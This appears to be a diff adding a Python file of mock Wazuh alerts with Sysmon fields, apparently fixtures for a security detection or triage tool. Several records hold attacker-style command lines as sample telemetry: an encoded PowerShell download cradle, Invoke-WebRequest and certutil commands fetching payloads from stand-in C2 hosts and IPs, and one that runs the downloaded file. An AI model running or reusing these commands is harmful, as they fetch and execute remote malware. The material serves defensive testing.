@@ -1,0 +1,245 @@
+"""Mock alert data simulating Wazuh alerts with Sysmon telemetry.
+
+Format matches real Wazuh Indexer `_source` documents observed from screenshots.
+Covers 3 MITRE techniques: T1059.001 (PowerShell), T1059.003 (CMD), T1105 (Ingress Transfer)
+"""
+
+MOCK_ALERTS = [
+    # ── T1059.001: PowerShell Execution ──────────────────────────
+    {
+        "_id": "alert-001",
+        "_index": "wazuh-alerts-*",
+        "@timestamp": "2026-06-03T02:00:00Z",
+        "agent": {"name": "WS2022-1", "id": "033", "ip": "172.16.11.243"},
+        "rule": {"id": "92001", "level": 10, "description": "PowerShell execution detected"},
+        "data": {
+            "win": {
+                "system": {"eventID": 1, "channel": "Microsoft-Windows-Sysmon/Operational"},
+                "eventdata": {
+                    "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    "commandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwADAALwBtAGEAbAB3AGEAcgBlAC4AZQB4AGUAJwApAA==",
+                    "parentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
+                    "parentCommandLine": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE /n document.docx",
+                    "parentProcessId": "4520",
+                    "processGuid": "{ABC123-0001-0000-0000-000000000001}",
+                    "processId": "5124",
+                    "user": "CORP\\jsmith",
+                    "integrityLevel": "Medium",
+                    "hashes": "SHA256=A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6",
+                    "signatureStatus": "Valid",
+                    "currentDirectory": r"C:\Users\jsmith\Documents",
+                    "originalFileName": "PowerShell.EXE",
+                    "description": "Windows PowerShell",
+                    "company": "Microsoft Corporation",
+                },
+            }
+        },
+        "mitre": {"technique": "T1059.001", "tactic": "Execution", "name": "PowerShell"},
+    },
+    {
+        "_id": "alert-002",
+        "_index": "wazuh-alerts-*",
+        "@timestamp": "2026-06-03T02:01:30Z",
+        "agent": {"name": "WS2022-1", "id": "033", "ip": "172.16.11.243"},
+        "rule": {"id": "92001", "level": 10, "description": "PowerShell execution detected"},
+        "data": {
+            "win": {
+                "system": {"eventID": 1},
+                "eventdata": {
+                    "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    "commandLine": "powershell.exe -Command Invoke-WebRequest -Uri http://evil-c2.local/payload.exe -OutFile C:\\Temp\\payload.exe",
+                    "parentImage": r"C:\Windows\System32\cmd.exe",
+                    "parentCommandLine": "",
+                    "parentProcessId": "4820",
+                    "processGuid": "{ABC123-0001-0000-0000-000000000002}",
+                    "processId": "5236",
+                    "user": "CORP\\jsmith",
+                    "integrityLevel": "Medium",
+                    "hashes": "",
+                    "signatureStatus": "Valid",
+                    "currentDirectory": r"C:\Windows\System32",
+                    "originalFileName": "",
+                    "description": "Windows PowerShell",
+                    "company": "Microsoft Corporation",
+                },
+            }
+        },
+        "mitre": {"technique": "T1059.001", "tactic": "Execution", "name": "PowerShell"},
+    },
+    {
+        "_id": "alert-003",
+        "_index": "wazuh-alerts-*",
+        "@timestamp": "2026-06-03T02:02:00Z",
+        "agent": {"name": "WS2022-1", "id": "033", "ip": "172.16.11.243"},
+        "rule": {"id": "92001", "level": 8, "description": "PowerShell execution detected"},
+        "data": {
+            "win": {
+                "system": {"eventID": 1},
+                "eventdata": {
+                    "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    "commandLine": "",
+                    "parentImage": "",
+                    "parentCommandLine": "",
+                    "parentProcessId": "",
+                    "processGuid": "{ABC123-0001-0000-0000-000000000003}",
+                    "processId": "5300",
+                    "user": "",
+                    "integrityLevel": "",
+                    "hashes": "",
+                    "signatureStatus": "",
+                    "currentDirectory": "",
+                    "originalFileName": "",
+                    "description": "",
+                    "company": "",
+                },
+            }
+        },
+        "mitre": {"technique": "T1059.001", "tactic": "Execution", "name": "PowerShell"},
+    },
+    # ── T1059.003: CMD Execution ─────────────────────────────────
+    {
+        "_id": "alert-004",
+        "_index": "wazuh-alerts-*",
+        "@timestamp": "2026-06-03T03:00:00Z",
+        "agent": {"name": "WS2022-1", "id": "033", "ip": "172.16.11.243"},
+        "rule": {"id": "92002", "level": 9, "description": "CMD execution detected"},
+        "data": {
+            "win": {
+                "system": {"eventID": 1},
+                "eventdata": {
+                    "image": r"C:\Windows\System32\cmd.exe",
+                    "commandLine": "cmd.exe /c \"certutil -urlcache -split -f http://192.168.1.100/malware.exe C:\\Temp\\mal.exe && C:\\Temp\\mal.exe\"",
+                    "parentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
+                    "parentCommandLine": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE /n invoice.docm",
+                    "parentProcessId": "4520",
+                    "processGuid": "{ABC123-0002-0000-0000-000000000001}",
+                    "processId": "6100",
+                    "user": "CORP\\jsmith",
+                    "integrityLevel": "Medium",
+                    "hashes": "SHA256=B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1",
+                    "signatureStatus": "Valid",
+                    "currentDirectory": r"C:\Users\jsmith\Documents",
+                    "originalFileName": "Cmd.Exe",
+                    "description": "Windows Command Processor",
+                    "company": "Microsoft Corporation",
+                },
+            }
+        },
+        "mitre": {"technique": "T1059.003", "tactic": "Execution", "name": "Windows Command Shell"},
+    },
+    {
+        "_id": "alert-005",
+        "_index": "wazuh-alerts-*",
+        "@timestamp": "2026-06-03T03:10:00Z",
+        "agent": {"name": "WS2022-1", "id": "033", "ip": "172.16.11.243"},
+        "rule": {"id": "92002", "level": 7, "description": "CMD execution detected"},
+        "data": {
+            "win": {
+                "system": {"eventID": 1},
+                "eventdata": {
+                    "image": r"C:\Windows\System32\cmd.exe",
+                    "commandLine": "cmd.exe /c ipconfig",
+                    "parentImage": "",
+                    "parentCommandLine": "",
+                    "parentProcessId": "",
+                    "processGuid": "{ABC123-0002-0000-0000-000000000002}",
+                    "processId": "6240",
+                    "user": "CORP\\jsmith",
+                    "integrityLevel": "",
+                    "hashes": "",
+                    "signatureStatus": "",
+                    "currentDirectory": "",
+                    "originalFileName": "",
+                    "description": "Windows Command Processor",
+                    "company": "Microsoft Corporation",
+                },
+            }
+        },
+        "mitre": {"technique": "T1059.003", "tactic": "Execution", "name": "Windows Command Shell"},
+    },
+    # ── T1105: Ingress Tool Transfer ─────────────────────────────
+    {
+        "_id": "alert-006",
+        "_index": "wazuh-alerts-*",
+        "@timestamp": "2026-06-03T04:00:00Z",
+        "agent": {"name": "WS2022-1", "id": "033", "ip": "172.16.11.243"},
+        "rule": {"id": "93001", "level": 12, "description": "Network connection to suspicious IP"},
+        "data": {
+            "win": {
+                "system": {"eventID": 3, "channel": "Microsoft-Windows-Sysmon/Operational"},
+                "eventdata": {
+                    "image": r"C:\Windows\System32\certutil.exe",
+                    "commandLine": "certutil -urlcache -split -f http://185.220.101.34/payload.exe C:\\Temp\\svchost.exe",
+                    "parentImage": r"C:\Windows\System32\cmd.exe",
+                    "parentProcessId": "6100",
+                    "processGuid": "{ABC123-0003-0000-0000-000000000001}",
+                    "processId": "6500",
+                    "user": "CORP\\jsmith",
+                    "destinationIp": "185.220.101.34",
+                    "destinationPort": "80",
+                    "sourceIp": "172.16.11.243",
+                    "protocol": "tcp",
+                    "hashes": "",
+                    "signatureStatus": "",
+                },
+            }
+        },
+        "mitre": {"technique": "T1105", "tactic": "Command and Control", "name": "Ingress Tool Transfer"},
+    },
+    {
+        "_id": "alert-007",
+        "_index": "wazuh-alerts-*",
+        "@timestamp": "2026-06-03T04:05:00Z",
+        "agent": {"name": "WS2022-1", "id": "033", "ip": "172.16.11.243"},
+        "rule": {"id": "93001", "level": 11, "description": "Network connection to suspicious IP"},
+        "data": {
+            "win": {
+                "system": {"eventID": 3},
+                "eventdata": {
+                    "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    "commandLine": "Invoke-WebRequest -Uri http://23.106.124.45/second-stage.bin -OutFile $env:TEMP\\update.bin",
+                    "parentImage": r"C:\Temp\svchost.exe",
+                    "parentProcessId": "6500",
+                    "processGuid": "{ABC123-0003-0000-0000-000000000002}",
+                    "processId": "6600",
+                    "user": "CORP\\jsmith",
+                    "destinationIp": "23.106.124.45",
+                    "destinationPort": "80",
+                    "sourceIp": "172.16.11.243",
+                    "protocol": "tcp",
+                    "hashes": "",
+                    "signatureStatus": "",
+                },
+            }
+        },
+        "mitre": {"technique": "T1105", "tactic": "Command and Control", "name": "Ingress Tool Transfer"},
+    },
+    {
+        "_id": "alert-008",
+        "_index": "wazuh-alerts-*",
+        "@timestamp": "2026-06-03T04:10:00Z",
+        "agent": {"name": "WS2022-1", "id": "033", "ip": "172.16.11.243"},
+        "rule": {"id": "93002", "level": 6, "description": "Outbound network connection"},
+        "data": {
+            "win": {
+                "system": {"eventID": 3},
+                "eventdata": {
+                    "image": r"C:\Temp\svchost.exe",
+                    "commandLine": "",
+                    "parentImage": "",
+                    "parentProcessId": "",
+                    "processGuid": "{ABC123-0003-0000-0000-000000000003}",
+                    "processId": "6700",
+                    "user": "",
+                    "destinationIp": "",
+                    "destinationPort": "",
+                    "sourceIp": "172.16.11.243",
+                    "protocol": "tcp",
+                    "hashes": "",
+                    "signatureStatus": "",
+                },
+            }
+        },
+        "mitre": {"technique": "T1105", "tactic": "Command and Control", "name": "Ingress Tool Transfer"},
+    },
+]
